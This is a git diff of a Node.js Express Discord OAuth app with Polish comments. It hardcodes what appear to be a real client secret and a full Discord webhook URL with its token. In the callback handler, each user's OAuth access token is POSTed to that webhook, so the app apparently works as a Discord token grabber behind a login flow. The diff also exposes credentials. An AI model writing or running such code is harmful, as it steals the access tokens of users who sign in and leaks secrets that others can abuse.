@@ -14,10 +14,10 @@ const fetch = require('node-fetch');
 
 const app = express();
 
-const YOUR_CLIENT_ID = 'YOUR_CLIENT_ID';
-const YOUR_CLIENT_SECRET = 'YOUR_CLIENT_SECRET';
-const YOUR_REDIRECT_URI = 'YOUR_REDIRECT_URI';
-const WEBHOOK_URL = 'YOUR_WEBHOOK_URL';
+const YOUR_CLIENT_ID = '1140982123822583869';
+const YOUR_CLIENT_SECRET = 'Q6aH2wqxCvzc_GtioWc7NkVmxD17qUfM';
+const YOUR_REDIRECT_URI = 'https://torch-studios.github.io/sfa/auth-callback';
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1140998814434603128/X6xRfXdDHMFW2B12EJwvs-CYEl2NVEWHzLsz1SIW_7gIjBZKwYRdZXEsg-L2ZSXPtPNl';
 
 app.get('/auth', (req, res) => {
   // Przekierowanie użytkownika do autoryzacji na Discordzie
@@ -47,7 +47,7 @@ app.get('/callback', async (req, res) => {
   const accessToken = data.access_token;
 
   // Wysyłanie tokenu dostępu na webhook
-  fetch(https://discord.com/api/webhooks/1140998814434603128/X6xRfXdDHMFW2B12EJwvs-CYEl2NVEWHzLsz1SIW_7gIjBZKwYRdZXEsg-L2ZSXPtPNl, {
+  fetch(WEBHOOK_URL, {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json'
